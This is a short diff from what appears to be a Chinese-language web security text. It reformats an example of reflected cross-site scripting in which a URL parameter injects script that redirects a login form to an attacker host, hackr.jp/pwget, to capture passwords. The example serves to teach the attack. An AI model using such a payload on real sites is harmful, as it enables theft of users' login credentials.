@@ -2429,8 +2429,8 @@ ID <input type="text" name="ID" value="yama" />
 
 
 > http://example.jp/login?ID=">
-> <script>var f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";
-> </script><span+s=" 对请求时对应的HTML源代码（摘录）
+> `<script>var f=document.getElementById("login");f.action="http://hackr.jp/pwget";f.method="get";
+> </script><span+s="` 对请求时对应的HTML源代码（摘录）
 
 
 
